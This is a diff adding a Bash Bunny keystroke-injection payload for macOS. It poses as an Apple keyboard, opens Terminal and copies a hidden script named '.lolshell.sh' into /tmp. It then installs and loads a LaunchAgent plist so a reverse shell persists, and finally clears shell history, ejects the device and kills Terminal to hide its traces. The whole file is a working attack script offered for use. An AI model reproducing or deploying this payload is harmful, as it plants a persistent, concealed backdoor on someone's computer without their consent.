@@ -1,0 +1,35 @@
+#!/bin/bash
+
+ATTACKMODE HID VID_0X05AC PID_0X021E STORAGE
+
+# Starting job (purple LED)
+LED R B 0
+
+# Start OSX Terminal
+QUACK GUI SPACE
+QUACK DELAY 1000
+QUACK STRING terminal
+QUACK ENTER
+
+# Write shell script
+QUACK DELAY 200
+QUACK STRING rm /tmp/.lolshell.sh \; cp -pr /Volumes/BashBunny/payloads/library/osx-revshell/lolshell.sh /tmp/.lolshell.sh
+QUACK ENTER
+
+# Add to the Launch Agents
+QUACK DELAY 200
+QUACK STRING cp /Volumes/BashBunny/payloads/library/osx-revshell/com.lolshell.plist \~/Library/LaunchAgents/com.lolshell.plist
+QUACK ENTER
+
+# Load the plist
+QUACK DELAY 200
+QUACK STRING launchctl load \~/Library/LaunchAgents/com.lolshell.plist
+QUACK ENTER
+
+# Start wind-down
+QUACK DELAY 200
+QUACK STRING history -c\; diskutil eject /Volumes/BashBunny\; killall Terminal
+QUACK ENTER
+
+# job complete (RED)
+LED R 100
